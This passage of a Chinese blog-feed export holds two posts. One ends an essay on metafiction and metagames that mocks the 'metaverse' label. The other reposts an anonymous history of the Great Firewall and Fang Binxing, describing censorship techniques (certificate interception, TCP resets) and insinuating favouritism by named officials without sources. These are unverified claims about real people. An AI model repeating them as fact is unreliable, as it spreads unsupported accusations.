但即便如此，探究本质的“meta”并没有被人遗忘，形而上学的影响力更是一直持续到了今天——举个最简单的例子：我是谁？我在哪？谁在打我？ 这个吃鸡玩家都不陌生的灵魂三问，和形而上学的“哲学三问”，赫然是一脉相承：我是谁？我从哪来？我到哪去？ 除了这种诙谐但意外精准的戏仿之外，从20世纪中期开始，伴随着后现代主义的崛起，“探究本质”的形而上学，在叙事学领域逐渐抬头，一系列挂着“meta”前缀的艺术表现类型，开始出现在我们面前——元小说（Metafiction）和元电影（Metacinema）就是个中典范，元游戏（Metagame）自然也不例外。 需要说明的是，尽管正式命名于 20 世纪，但采用“元叙事”创作手段的艺术作品，历史远不仅仅半个世纪那么短暂——例如说，塞万提斯创作于 17 世纪的《堂吉诃德》，就被不少学者认为是“元小说”的原型典范之一： “执行遗嘱的两位先生如果碰见《堂吉诃德·台·拉·曼却生平事迹第二部》的作者，请代我竭诚向他道歉：他写那部荒谬绝伦的书，虽然没有受我委托，究竟还是为了我，我到死还是觉得对他不起。” 这是咱们堂吉诃德老先生在小说末尾留下的最后一句遗言，虽然文不甚公理不甚精，但三言两语之间，就把《堂吉诃德》这部虚构小说、“堂吉诃德”这个虚构人物外加塞万提斯这个真实存在的作者批判了一番，顺带手凿开了挡在虚构与现实之间的那面不可言状之墙，身体力行地完美解答了“在虚构的故事当中寻求真实的人脑袋是不是有问题”——把“meta”融入现代小说创作，效果就是这么惊艳。 再考虑到《堂吉诃德》人尽皆知的诙谐幽默，显而易见，从萌芽诞生到在近代迎来复兴，从哲学领域逐渐出圈的“meta”，并不是什么诘屈聱牙不可名状的玄学，事实上，它的接地气程度，远超预期： 没错，这些面向低龄读者的绘本，都属于标准的元叙事作品。 理所当然，和大部分三言两语说不尽主题的后现代“元小说”相比，这些元叙事的童书对“meta”展开的诠释，显然要更加通透：虚构和现实的界限被打破，“读者”不再是隔岸观景的局外人，而是越过了破碎的虚实边界，成为了整套开放式叙事架构的参与者——这种超越了传统叙事体系封闭自洽逻辑的颠覆式创作手法，就是“元叙事”最基本的定义。 从元叙事到元游戏 元宇宙中最出挑的之所以是 VR ，与“元”这一概念在媒介中的演进是密不可分的。 元宇宙（Metaverse）这个词最初出现在上世纪 90 年代的科幻作品《雪崩》中，而《雪崩》之所以构想出元宇宙，是因为在上世纪 90 年代开始，3D技术刚刚崭露头角的电子游戏，已经开始探索利用元叙事的手法打破虚拟与现实的界限。 发售于 1998 年的《潜龙谍影》初代，在游戏流程初期的一场 Boss 战结束后，情节推进到需要联络潜伏在敌方内部的内应人员；然而，攸关后文展开的无线电联络频率，却在这时莫名其妙地遗失了（相关 NPC 表示“忘记了”），怎么办？ 放在常规游戏里，这种故意刁难人的桥段，免不了要让玩家东奔西走白折腾半天，但《潜龙谍影》却给了我们截然不同的答案： ——注意红框里的“back of the CD case”，真相是这个： 就在《潜龙谍影》的实体游戏光盘包装盒背面，一张不起眼的游戏截图上，攸关情节推进的无线电通讯频率清晰可见。 尽管乍看之下，这种小技俩很容易让人联想到早期游戏厂商防止盗版设计的花招，但在《潜龙谍影》当中，这个桥段赫然是主线剧情的一环，个中含义可就不太一样了： 不要误会，我清楚我是游戏里的角色。想要把这个游戏继续玩下去，必须在游戏外做点事才行——这个我做不到，但你可以，没错，就是握着手柄盯着电视机的你。 这种直接破开“第四面墙”、在传统游戏闭环叙事逻辑上撬开天窗窥探新世界的震憾，正是23年前，《潜龙谍影》带给我们的元游戏体验——货真价实的meta颠覆滋味，清晰可辨。 综上所述，我们可以清晰地看出，逻辑层面上的“颠覆”，引申为对原有架构的“超越”，始终是“meta”概念的核心——研究现实世界的形而上学，要打破的是构筑“现实”的物理概念疆域； 研究我们创造物的元叙事，打破了小说、电影与游戏这些艺术创作的叙事边界。藉由这些颠覆性的僭越行为，来对隐藏在“常规认知”之下的概念本质进行探索，这就是作为“元”的 meta，真正的价值所在。 当然，对于 meta 这个词缀，其实还有更简单的理解方法。 正如“metaphysics”指的是“形而上学”，可以理解为“超越物质的学问”“理解物质世界的学问”“物质世界之后/之上才能有的学问”，其他使用“meta”的词汇也都是此意。 比如 metadata 就是用来描述数据的数据，如果没有 data 本身，系统里是不需要有一个“metadata”的。而常玩竞技游戏比如 DOTA 2 的玩家也会知道有个词叫“metahero”——这是什么意思呢，超越英雄的英雄？字面上是这样没错，实际上 metahero 指的是“版本答案”，也就是版本经过一段时间、玩家逐渐探寻出成熟战术以后，屹立于版本顶点的那些英雄。 熟悉龙与地下城的玩家更加熟悉，“metamagic”被直接翻译成了“超魔”，指的是改造基础魔法形成的新魔法。我们可以很简单地看到，meta 是一个相对概念，如果没有物质，就不会有“形而上学”；如果没有数据，就不会有元数据。同理，如果从没有过“game”，那么自然也就不会有“元游戏”。 这是为什么呢？我们或许需要从元游戏比较经典的几个早期作品说起。尽管《潜龙谍影》小小地运用过元游戏的手法，但是《潜龙谍影》本身不可以视作元游戏，因为它并非以这些手法作为游戏核心。 打开了很多国人玩家对元游戏认知的《ICEY》，在这方面用得就比较猛了——一个银河城式的动作冒险，却通过“旁白君”的存在火了起来。旁白君不断地提醒玩家游戏世界的虚构性（恰似《史丹利的寓言》），再点缀少量的类似“DOMO工作室”一样的彩蛋，对于许多从未接触过元游戏概念的玩家来说，还是蛮新鲜的。 不过《ICEY》的这些手段，其实停留在较浅的层次——或者说，还不敢对国内玩家造成太大的冲击。在另一些把“元”手段利用得更狠的游戏中，“虚构性”直接影响了游戏本身的进程。 比如在《One Shot》中，玩家需要像《潜龙谍影》翻CD盒那样，去探索存在在硬盘中的游戏文件。 又比如《你和她和她的恋爱》中，游戏干脆一边玩一边修改游戏自己的程式，导致玩家彻底无法走回头路——呃，360 安全卫士或许成了守护玩家记忆的英雄…… 而在其实不太“元”的《Undertale》中，游戏的世界观干脆说明，玩家扮演的角色之所以那么强大，比游戏世界中的一切存在都厉害，是因为玩家拥有“决心”——决心是什么，是游戏的存档和读档机制啊。你可以挑战无限次对手，怎能不强？ 而相比正能量的“决心”，《心跳文学部》利用的则是更加阴间的游戏机制。 这就涉及了“游戏之后”的本质问题：元游戏的设计，建立在游戏本身不同于现实世界的表现手法上；如果没有前人成百上千游戏作品的铺垫，这些手法就不会定型；如果作者不清楚游戏世界和真实世界到底有什么区别，也就无从“元”起。 上述是“元游戏”的第一个特征，也就是“超越游戏”。元游戏是基于游戏固有的生产方式和物理形态才诞生的，是“游戏之后的游戏”，利用了“手法之后的手法”。 而元游戏的另一个特征，则是与元小说、元电影相同的“自反性”。自反性提出的问题是，游戏是一种载体，还是内容本身？游戏需要传达的，是游戏中“真实的故事”，还是在地球上被游戏开发者做出来的，这个“真实的游戏”？ 让我们从游戏鬼才Daniel Mullins的两款作品《Pony Island》和《Inscryption（邪恶冥刻）》谈起。比起已经快10年的《史丹利的寓言》，这两个游戏比较年轻，现在玩也还蛮新鲜。 在《Pony Island》中，玩家会被迫玩一个感觉怪怪的游戏，随后很快就会发觉，我们要做的不是“玩”“这个”游戏，而是“改”“另一个”游戏！因为在《Pony Island》中，玩家扮演的角色是一个被迫玩游戏的人；而想要成功破关，我们必须得先把这些游戏改得“能玩”。 这与《史丹利的寓言》中，那些在设计层面上反复提醒你游戏世界“不真实”或说“不够真实”的桥段有异曲同工之妙——他们揭露了游戏生产的思维方式，从游戏制作人的角度直接与玩家交流。而这些游戏的目的，多少是探寻游戏设计本身的道理和原则，或者吐槽游戏制作的辛酸——瞧瞧，这是不是和对应“物理学”的“形而上学”是一回事儿？ 在《Inscryption（邪恶冥刻）》中，作者吸取了《Pony Island》的经验，让游戏的元叙事显得更巧妙。玩家花了几个小时玩一个卡牌游戏，结果视角一转——哇靠，这游戏居然不是卡牌游戏？ 正如在《Pony Island》玩家扮演着被迫玩游戏的人，在《Inscryption（邪恶冥刻）》中，玩家扮演的则是“被迫打牌”的人。我们的目的不是一局一局无限打下去，而是逃出逼你打牌的人的魔爪——而游戏的表现方式，则是通过卡牌游戏-探索游戏两种视角、两种玩法的切换，让玩家陷入作者的“游戏诡计”，达到“新鲜刺激”的体验。 我们可以看到，在客观层面上，元游戏通过挖掘、揭露、拆分“游戏”这种文艺作品本身的理念和方法，来达到交流游戏、研究游戏的目的；而在主观层面上，这种“自反性”，或者说“刻意在虚构的世界里揭露虚构”的动作，并非“为了反而反”，而能达成一些强化游戏本身叙事、让游戏“更好玩”的目的。 刚才提到的《Inscryption（邪恶冥刻）》就是一个典型。很明显，对比“一个卡牌游戏”+“另一个密室逃脱游戏”，这种“卡牌糅合密室逃脱”的玩法虽然非常规一些，但给玩家带来的游戏体验绝非1+1=2那么简单。实现这种惊喜效果，靠的是游戏“受限的视角和自由度”（这些在《史丹利的寓言》中已经讲穿了）。 在必要的时候，“受限”反而是一件好事。如果玩家真的坐在桌子前打牌，我们会知道我们是和谁一起玩，在哪个朋友的家里，我们旁边有零食有水，知道应该几点离开，可以一边打牌一边聊天，甚至可以出老千…… 游戏不需要还原这些东西，但是游戏能让你暂时“忘却”一些相对打牌没那么关键的要素。而在玩家通过种种细节意识到“我靠我好像真的坐在牌桌前”的时候，我们就可以站起来，玩另一种游戏了——这种体验，在现实的牌桌上，反而是不存在的。 而在另一些元游戏设计中，“游戏视角”也被以其他形式应用为类似“牌桌诡计”的手法。 比如在 VN 名作《Ever17》中，游戏把 Visual Novel（视觉小说）这种载体的固有形态发挥到极致，利用玩家“我扮演的肯定是游戏主角”这种先入为主的观念，制造了一个叙事谜题。经历几十小时的诡异剧情，直到玩家发现游戏内的各种描述都不合逻辑时，才会恍然发现“我靠这个视角不是主角视角”或者说“我靠这个人居然不是主角”，然后游戏想讲述的故事才真正开始。 我们可以发现，成功的元游戏作品对“虚构中的虚构”的利用，不仅没有破坏游戏本身的质量，让玩家“出戏”，反而通过限制玩家的输入、输出达成了更直接、更简洁、更巧妙的游戏设计，而无需提前在游戏系统和UI介绍中啰哩巴嗦一大堆，也能制作更复杂更深刻的游戏。 因此我们也可以说，“自反性”是表面的反和根本的“自”。在一个成功的元游戏中，游戏作为载体的“我被用来给大家描述一些内容”的价值，和游戏作为内容的“我本身就值得你们好好研究”的价值实现了比较完美的对立统一。而只有在这个层次上，我们才能发觉元游戏的价值，在game之前的“meta”才显得有意义而非那么矫情。 正如《堂吉诃德》虽然吐槽自己是一部胡来的书，但这种“胡来”又正好令整部书的荒诞显得那么真实和那么有现实意义。可以说，“自反性”正是元小说、元电影和元游戏的醍醐味所在。 然而由此一来，让我们重新审视一下“元宇宙（metaverse）”，结论马上就变得诡异起来：按照前面推导出的meta构词理论，“元宇宙（metaverse）”理应是对“现实宇宙”的颠覆乃至超越——然而，此时此刻站在风口浪尖的“元宇宙”，究竟是个什么定义？ 一处虚拟现实空间，用户可以身处其中，与计算机生成的环境和其他人交流互动。 就这？ 既没有实现大统一理论，也无法证明暗物质存在，就连地外生命存在与否都没有结论，从形式到实质上没有任何颠覆，就凭一个画地为牢继续把我们囚禁在社交网络里的数字监狱，也敢大言不惭地自称“元宇宙”？ 就这，也配叫“meta”？ 所以回到主题，我想说的也就很简单了： 首先，我看不到目前的“元宇宙”到底在哪里超越了“宇宙”，对“宇宙”的哪些存在和规则做了深入挖掘和利用，看到的只是一些使用粗糙的表现手法复制真实宇宙规则的低劣尝试。诚然，metaverse 也是“宇宙之后的宇宙”，但这不是脱了裤子放屁么？无论元数据、元游戏还是元小说，都是对“前者”存在的归纳、总结和升华，元宇宙到底升华在了哪里？ 其次，我也看不到“元宇宙”的自反性，看不到载体和内容在元宇宙中的对立统一，只看到元宇宙把玩家从真实宇宙中割裂出来的孤独感。我并不反对任何人在虚拟世界里构建自己的小世界，这其实还蛮好玩的——但您愣要说这个东西和真实世界是互动、互补乃至超越的，恐怕嘴有点太大了吧？ 元宇宙到底“meta”在何处？ 按照因罗永浩转发而在中文互联网流行的最新一个版本来说（由投资 KOL Shaan Puri 发布于 Twitter），“元宇宙是一个时间”，元宇宙是如技术奇点一样，是大多数“人们发现生活在数字世界比生活在现实世界更有意义的那一刻”。 因此，元宇宙就是我们沉迷抖音与王者荣耀的当下，是我们默许了刷健康码才能出行的当下，是数字世界与物理世界无法完全被区分对待的当下，是芯片缺货导致手机和汽车涨价的当下，是 VR 设备永远不能小型化，是分布式互联网永远无法落地的当下。 照此说来，元宇宙就是基底宇宙，你我已在元宇宙之中。 那么，何谈未来呢？ ","link":"https://blog.gd1214b.icu/post/p_nFLMvOV/"},{"title":"阅后即焚：“GFW”的前世今生，一部“GFW”之父方滨兴的发家史","content":" 本文转自：http://blog.renren.com/share/200487056/5148854419（永久失效链接） . 原始内容由互联网档案馆 存档于2017年4月21日：https://web.archive.org/web/20170421092911/http://blog.renren.com/share/200487056/5148854419 标题的GFW之所以加上引号是因为，GFW是局外人起的绰号，它的真实称呼并非如此，但”GFW”也确实如实涵盖了这一在中国一贯隐晦而模糊的概念。 时间表 1998年9月22日，公安部部长办公会议通过研究，决定在全国公安机关开展全国公安工作信息化工程――”金盾工程”建设。 1999年4月20日，公安部向国家计委送交金盾工程立项报告和金盾工程项目建议书。 1999年6月，国家计算机网络与信息安全管理中心成立，局级事业单位。 1999-2000年，在哈尔滨工业大学任教多年的方滨兴调任国家计算机网络与信息安全管理中心副总工程师。 1999年12月23日，国务院发文成立国家信息化工作领导小组，国务院副总理吴邦国任组长。其第一下属机构计算机网络与信息安全管理工作办公室设在已经成立的国家计算机网络与信息安全管理中心，取代计算机网络与信息安全管理部际协调小组，对”公安部、安全部、保密局、商用密码管理办公室以及信息产业部”等部门的网络安全管理进行组织协调。 2000-2002年，方滨兴在国家计算机网络与信息安全管理中心任总工程师、副主任、教授级高级工程师。 2000年4月20日，公安部成立金盾工程领导小组及办公室。 2000年5月，005工程开始实施。 2000年10月，信息产业部组建计算机网络应急处理协调中心。 2000年12月28日，第九届全国人民代表大会常务委员会第十九次会议通过《关于维护互联网安全的决定》。 2001年，方滨兴”计算机病毒及其预防技术”获国防科学技术三等奖，排名第一。 2001年，方滨兴获国务院政府特殊津贴、信息产业部”在信息产业部重点工程中出突出贡献特等奖先进个人”称号，中组部、中宣部、中央政法委、公安部、民部、人事部等联合授予”先进个人”称号。 2001年1月19日，国家计算机网络与信息安全管理中心上海分中心成立，位于上海市黄浦区中山南路508号6楼。国家计算机网络应急技术处理协调中心上海分中心是工业和信息化部直属的中央财政全额拨款事业单位。 2001年4月25日，”金盾工程”经国务院批准立项。 2001年7月，计算机网络与信息安全管理工作办公室批准哈尔滨工业大学建立国家计算机信息内容安全重点实验室，胡铭曾、方滨兴牵头。 2001年7月24日，国家计算机网络与信息安全管理中心广州分中心成立，位于广州市越秀区建中路2、4号。 2001年8月8日，国家计算机网络与信息安全管理中心组建国家计算机网络应急处理协调中心，缩写CNCERT/CC。 2001年8月23日，国家信息化领导小组重新组建，中央政治局常委、国务院总理朱镕基任组长。 2001年11月28日，国家计算机网络与信息安全管理中心上海互联网交换中心成立。提供”互联网交换服务，互联网骨干网华东地区数据交换，数据流量监测与统计，网间通信质量监督，交换中心设备维护与运行，网间互联费用计算，网间互联争议协调”，位于上海市黄浦区中山南路508号。 2001年11月28日，国家计算机网络与信息安全管理中心广州互联网交换中心成立，位于广州市越秀区建中路204号。 2001年12月，在北京的国家计算机网络与信息安全管理中心综合楼开始兴建。 2001年12月17日，国家计算机网络与信息安全管理中心湖北分中心成立。 2002年，方滨兴任中国科学院计算技术研究所客座研究员、博士生导师、信息安全首席科学家。2002-2006年，方滨兴在国家计算机网络与信息安全管理中心任主任、总工程师、教授级高级工程师，升迁后任其名誉主任。 2002年1月25日，报道称：”国家计算机网络与信息安全管理中心上海互联网交换中心日前开通并投入试运行，中国电信、中国网通、中国联通、中国吉通等4家国家级互联单位首批接入。中国移动互联网的接入正在进行之中，近期可望成为第五家接入单位。” 2002年2月1日，国家计算机网络与信息安全管理中心新疆分中心成立。 2002年2月25日，国家计算机网络与信息安全管理中心贵州分中心成立。 2002年3月20日，多个国家计算机网络与信息安全管理中心省级分中心同时成立。 2002年9月3日，Google.com被封锁，主要手段为DNS劫持。 2002年9月12日，Google.com封锁解除，之后网页快照等功能被封锁，手段为TCP会话阻断。 2002年11月，经费6600万的国家信息安全重大项目”大范围宽带网络动态阻断系统”（大范围宽带网络动态处置系统）项目获国防科学技术二等奖。云晓春排名第一，方滨兴排名第二。哈尔滨工业大学计算机网络与信息内容安全重点实验室李斌、清华大学计算机系网络技术研究所、清华大学网格计算研究部杨广文有参与。 2003-2007年，方滨兴任信息产业部互联网应急处理协调办公室主任。 2003年1月31日，经费4.9亿的国家信息安全重大项目”国家信息安全管理系统”（005工程）获2002年度国家科技进步一等奖，方滨兴排名第一，胡铭曾排名第二，清华大学排名第三，哈尔滨工业大学排名第四，云晓春排名第四，北京大学排名第五，郑纬民排名第七，中国科学院计算技术研究所有参与。 2003年2月，在北京的国家计算机网络与信息安全管理中心综合楼工程竣工。 2003年7月，国家计算机网络应急处理协调中心更名为国家计算机网络应急技术处理协调中心。 2003年9月2日，全国”金盾工程”会议在北京召开，”金盾工程”全面启动。 2004年，国家信息安全重大项目”大规模网络特定信息获取系统”，经费7000万，获国家科技进步二等奖。 2005年，方滨兴任国防科学技术大学兼职教授、特聘教授、博士生导师。 2005年，方滨兴被遴选为中国工程院院士。 2005年，”该系统”已经在北京、上海、广州、长沙建立了互相镜像的4套主系统，之间用万兆网互联。每套系统由8CPU的多节点集群构成，操作系统是红旗Linux，数据库用的是OracleRAC。2005年国家计算机网络与信息安全管理中心（北京）就已经建立了一套384*16节点的集群用于网络内容过滤（005工程）和短信过滤（016工程）。该系统在广州、上海都有镜像，互相以十万兆网链接，可以协同工作，也可以独立接管工作。 2006年11月16日，”金盾工程”一期在北京正式通过国家验收，其为”为中华人民共和国公安部设计，处理中国公安管理的业务，涉外饭店管理，出入境管理，治安管理等的工程”。 2007年4月6日，国家计算机网络与信息安全管理中心上海分中心机房楼奠基，位于康桥镇杨高南路5788号，投资9047万元，”……是国家发改委批准实施的国家级重大项目，目前全国只有北京和上海建立了分中心，它是全国互联网信息海关，对保障国家信息安全担负着重要作用。” 2007年7月17日，大量使用中国国内邮件服务商的用户与国外通信出现了退信、丢信等普遍现象。 2007年12月，方滨兴任北京邮电大学校长。 2008年1月18日，信息产业部决定免去方滨兴的国家计算机网络与信息安全管理中心名誉主任、信息产业部互联网应急处理协调办公室主任职务，”另有职用”。 2008年2月29日，方滨兴当选第十一届全国人民代表大会安徽省代表。 2009年8月10日，方滨兴在”第一届中国互联网治理与法律论坛”上大力鼓吹网络实名制。 机构关系 国家计算机网络与信息安全管理中心（安管中心）是原信产部现工信部的直属部门。 安管中心与国家信息化工作领导小组计算机网络与信息安全管理工作办公室与国家计算机网络应急技术处理协调中心（CNCERT/CC，互联网应急中心）是一个机构几块牌子的关系。比如方滨兴简历中”1999-2000年在国家计算机网络应急技术处理协调中心任副总工”与”计算机网络应急处理协调中心”的成立时间两种说法就有着微妙的矛盾。实际上几个机构的人员基本一致。安管中心下属互联网交换中心与国家互联网络交换中心是不同的机构。各安管中心省级分中心一般挂靠当地的通信管理局。 安管中心的主要科研力量来自”哈尔滨工业大学一定会兴盛”方滨兴当博导有一批学生的哈工大以及关系良好的中科院计算所，这两个机构是那三个国家信息 安全重大项目的主要参与者，之后还在不断吸引人才并为安管中心输送人才和技术。在方滨兴空降北邮之后，往安管中心输血的成分中哈工大的逐渐减少，北邮的逐渐增多。 CNCERT/CC的国内”合作伙伴”有中国互联网协会主办北京光芒在线网络科技有限公司承办的中国互联网用户反垃圾邮件中心，是个没有实权的空壳；国家反计算机入侵及防病毒研究中心、国家计算机病毒应急处理中心，是公安部、科技部麾下；违法和不良信息举报中心是国新办势力范围；国家计算机网络入侵防范中心是中科院研究生院的机构，同样直接支撑CNCERT/CC。 CNCERT/CC的应急支撑单位中民营企业最初领跑者是绿盟，后来绿盟因其台谍案被罢黜，启明星辰取而代之。而安管中心具有一些资质认证、准入审 批的行政权力，这可能是民间安全企业趋之若骛的原因。不过，民营企业并未参与到国家信息安全的核心项目建设中，安管中心许多外围项目交给民企外企做，比如 像隔离器之类的访问限制设备外包给启明星辰以作为辅助、备用，或者在与他们在网络安全监测上有所交流。 GFW与金盾没有关系 敏锐的读者从时间表应该已经看出这样的感觉了。实际上，GFW与金盾就是没有关系，两者泾渭分明，有很多区别。 公安系统搞网络监控的是公安部十一局 GFW是“国家信息关防工程”的一个子工程,直接上级是国家信息化工作领导小组和信息产业部是政治局亲自抓的国防工程.这个工程主要监测发现有害网站和信息,IP地址定位,网上对抗信息的上报,跟踪有害短信息和及时进行封堵。 江泽民,朱镕基,胡锦涛,李岚清,吴邦国等多次视察该工程 “国家信息关防工程”包括 “国家信息安全管理系统 工程代号为005。还有国家信息安全016工程等等 GFW主要是舆情情报系统的工具，而金盾主要是公安系统的工具。GFW的总支持者是负责宣传工作的李长春，和张春江 江绵恒 最初的主要需求来自政治局 政法委 安全部 610办 ；而金盾的总支持者是公安系统的高层人士，主要需求来自公安部门。GFW主外，作网络海关用；而金盾主内，作侦查取证用。GFW建设时间短，花费少，成效好；而金盾 建设时间长，花费巨大（GFW的十倍以上），成效不显著。GFW依附于三个国家级国际出入口骨干网交换中心从CRS GSR流量分光镜像到自己的交换中心搞入侵检测，再扩散到一些放在ISP那里的路由封IP，位置集中，设备数量少；而金盾则是公安内部信息网络，无处不在，数量巨大。GFW的科研实力雄厚，国内研 究信息安全的顶尖人才和实验室有不少在为其服务，比如哈工大信息安全重点实验室、中科院计算所 软件所 高能所 国防科大总参三部 安全部9局 北邮 西电 、 上海交大 北方交大 北京电子科技学院 解放军信息工程学院 解放军装甲兵工程学院 信产部中电30所 总参56所等等；另外几乎所有985 211高校都参与此工程 一些公司商业机构也参与某些外围工程项目如 Websense packeteer BlueCoat 华为 北大方正 港湾 启明星辰 神州数码也提供了一些辅助设备 中搜 奇虎 北京大正 雅虎等等参与了搜索引擎安全管理系统 在某些省市级的网络机房里，接入监控的部门就五花八门了，有安全、公安、纪检、部队，等等部署的设备也是五花八门 正规军 杂牌军 洋外援各自为战. 而金盾的科研实力较弱，公安系统的公安部第三研究所信息网络安全研发中心、国家反计算机入侵与防病毒研究中心都缺乏科研力量和科研成果，2008年8月成立信息网络安全公安部重点实验室想 与哈工大的重点实验室抗衡，还特意邀请方滨兴来实验室学术委员会，不过这个实验室光是电子数据取证的研究方向就没什么前景，而且也没什么研究成果。GFW之父方滨兴没有参与金盾工程，而工程院里在支持金盾工程的是沈昌祥；实际上那个公安部重点实验室的学术委员会名单很是有趣，沈昌祥自然排第一，方滨兴因为最近声名太显赫也不好意思不邀请他，方滨兴可能也有屈尊与公安系统打好关系的用意。 GFW发展和状况 GFW主要使用的硬件来自曙光和华为，没有思科、Juniper，软件大部为自主开发。原因很简单，对国家信息安全基础设施建设，方滨兴在他最近的 讲话《五个层面解读国家信息安全保障体系》中也一直强调”信息安全应该以自主知识产权为主”。何况GFW属于保密的国防工程而且GFW没有闲钱去养洋老爷，肥水不流外人田。李国杰是工程院信息工程部主任、曙光公司董事长、中科院计算所所长，GFW的大量服务器设备订单都给了曙光。方滨兴还将安管中心所需的大型机大订单给李国杰、国防科大卢锡城、总参56所陈左宁三位院士所在单位各一份。所以GFW为什么那么多曙光的设备，GFW为什么那么多中科院计算所的科研力量，为什么方滨兴成为 中科院计算所和国防科大都有显赫的兼职，为什么方滨兴从老家哈尔滨出来打拼短短7年时间就入选工程院卢浮宫？就是因为方滨兴头脑灵活，做事皆大欢喜。 网上有人讽刺GFW夜郎自大，事实上这是盲目乐观，无知者无畏。GFW的技术是世界顶尖的，GFW集中了哈工大、中科院、北邮货真价实的顶尖人才， 科研力量也是实打实地雄厚，什么动态SSL Freenet VPN SSH TOR GNUnet JAP I2P Psiphon 什么Feed Over Email 算什么葱。所有的翻墙方法，只要有人想得到，GFW都有研究并且有反制措施的实验室方案储备。 比如说：串接式封堵 采用中间人攻击手段来替换加密通信双方所用的没有经过可信赖CA签名保护的数字证书网关/代理间的证书协调，在出口网关上进行解密检测也就是所谓深度内容检测 七层过滤 HTTPS 是需要认证的。客户端访问服务器时，服务器端提供CA证书，但有些实现也可以不提供CA证书那么对于不提供CA证书的服务器，防火墙处理很简单，一律屏蔽掉另外检测默认的CA发证机构，如果证书不是这些机构（Verisign、Thawte Geotrust）发的，杀无赦就是在客户端与服务器端进行https握手的阶段，过滤掉一切无CA证书或使用不合法CA证书的https请求。这一步是广谱过滤，与服务器的IP地址无关。 GFW主要是入侵防御系统，检测-攻击两相模型。 所有传输层明文的翻墙方案，检测然后立即进行攻击是很容易的事情；即使传输层用TLS之类的加密无法实时检测，那种方案面向最终用户肯定是透明的，谁也不能阻止GFW也作为最终用户来静态分析其网络层可检测特征。 入侵检测然后TCP会话重置攻击算是干净利落的手段了，最不济也能通过人工的方式来查出翻墙方 法的网络层特征（仅仅目标IP地址就已经足够）然后进行定点清除。 如果是一两个国家的敌人，GFW也能找到集群来算密钥。GFW是难得能有中央财政喂奶的科研项目。那些在哈工大地下室、中科院破楼里的穷研究生即使没有钱也能搞出东西来，现在中央财政喂奶，更是干劲十足了。 GFW什么都行，就是P2P没办法，因为匿名性太好了，既不能实时检测出来，也无法通过静态分析找到固定的、或者变化而可跟踪的网络层特征。就这样也能建两个陷阱节点搞点小破坏，而且中科院的242项目”P2P协议分析与测量”一直都没停。什么时候国外开学术会议还是Defcon谁谁发一篇讲Tor安全性的paper，立即拿回来研究一番实现一下，已然紧跟学术技术最前沿了。不过实际上，即使GFW这样一个中国最顶尖的技术项目也摆脱不了山寨的本性，就是做一个东西出来很容易，但是要把东西做细致就不行了。 不过可能有人就疑问，为什么GFW什么都能封但又不真的封呢？我的这个翻墙方法一直还是好好的嘛。其实GFW有它自己的运作方式。GFW从性质上讲 是纯粹的科研技术部门，对政治势力来说是一个完全没有主观能动性的工具。GFW内部有很严格权限管理，技术与政治封装隔离得非常彻底。封什么还是解封什 么，都是完全由上峰决定，党指挥枪，授权专门人员操作关键词列表，与技术实现者隔离得很彻底，互相都不知道在做什么。所以很多时候一些莫名其妙的封禁比如 封freebsd.org封freepascal.org（可能都联想到freetibet.org），或者把跟轮子的 GPass八杆子打不着的”package.debian.org/zh-cn/lenny/gpass” 列为关键词，都是那些摆弄着IE6的官僚们的颐指气使，技术人员要是知道了都得气死。 方滨兴在他最近的讲话《五个层面解读国家信息安全保障体系》中讲一个立足国情的原则，说：”主要是强调综合平衡安全成本与风险，如果风险不大就没有必要花太大的安全成本来做。在这里面需要强调一点就是确保重点的，如等级保护就是根据信息系统的重要性来定级，从而施加适当强度的保护。” 所以对于小众的翻墙方式，GFW按照它的职能发现了也就只能过一下目心里有个底，上峰根本都不知道有这么一种方式所以也根本不会去封、GFW自己也没权限封，或者知道了也懒得再花钱花精力去布置。枪打出头鸟，什么时候都是这样。 目前的状况是对于敏感数据能通过封锁基本上就是安全的，否则就被过滤掉了，对于庞大的网络数据用人来分析是不可能的，敏感数据只能基于过滤技术根据数据流里面的一些特征来发现，目前的解密技术对于庞大数据流量和加密技术想使用解密的方法是不可能实现的，只要加密数据流没有可识别的特征，过滤技术就不会有任何记录和反映，因此过滤技术是无法真正实现网络封锁的，因此必需加入新的参数，它们选择了量，即保存你的一段时间的数据。 现在的破网方法用的比较多得是动态网，无界，花园，等等，由于接点相对来说是有限的和可知的，因此保存一段时间的数据就有了意义，由于使用破网软件的人很多，不可能人人都抓，可以根据量来区分出重点，和经常使用破网软件的人，当然你可已通过代理来连接这些可知接点来解决这个问题，破网软件也提供了这样的方法，但是通过代理联接可知的接点的请求还是可能被截获的方滨兴一个人把GFW崛起过程中的政治势能全部转化为他的动能之后就把GFW扔掉了。 现在GFW是平稳期，完全是清水衙门，既没有什么后台，也无法 再有什么政治、资金上的利益可以攫取，也无法再搞什么新的大型项目，连IPv6对GFW来说都成了一件麻烦事情。方滨兴在他最近的讲话《五个层面解读国家信息安全保障体系》中也感慨道：”比如说Web 2.0概念出现后，甚至包括病毒等等这些问题就比较容易扩散，再比如说IPv6出来之后，入侵检测就没有意义了，因为协议都看不懂还检测什么……” GFW 一直就没有地位，一直就是一个没人管的萝莉，国新办、网监、广电、版权、通管局之类的怪蜀黍都压在上面要做这做那。所以方滨兴在他最近的讲话《五个层面解读国家信息安全保障体系》中也首先强调一个机制，”需要宏观层面，包括主管部门予以支持。”所以，想解封网站，不要去找GFW本体，那没用，要去找GFW的上峰，随便哪个都行。而ISP就根本跟GFW没关系了，都不知道GFW具体搞些什么，起诉ISP完全属于没找到脉门。 不过GFW现在还是运行得很好，工作能力还有很大潜力可挖，唯一害怕的就是DDoS死撞墙。GFW的规模在前面的时间表里也有数字可以估计，而且 GFW现在的网站封禁列表也有几十万条之多。网络监控和对MSN YMSG ICQ等IM 短信监控也都尽善尽美。GFW在数据挖掘和协议分析上做的还比较成功多媒体数据如音频 视频 图形图像的智能识别分析 自然语言语义判断识别模式匹配 p2p VoIP IM 流媒体 加密内容识别过滤 串接式封堵 等等是将来的重点不过GFW也没有像机器学习之类的自组织反馈机制来自动生成关键词，因为它 本身没有修改关键词的权限，所以这种技术也没必要，况且国内这种技术也是概念吹得多论文发得多实践不成熟。现在GFW和金盾最想要的就是能够从万草从中揪出一小撮毒草的数据挖掘之类的人工智能技术。 方滨兴在他最近的讲话《五个层面解读国家信息安全保障体系》中提到”舆情驾驭核心能力”，”首先要能够发现和获取，然后要有分析和引导的能力”。怎么发现？就靠中科院在研的973课题”文本识别及信息过滤”和863重点项目”大规模网络安全事件监控”这种项目。 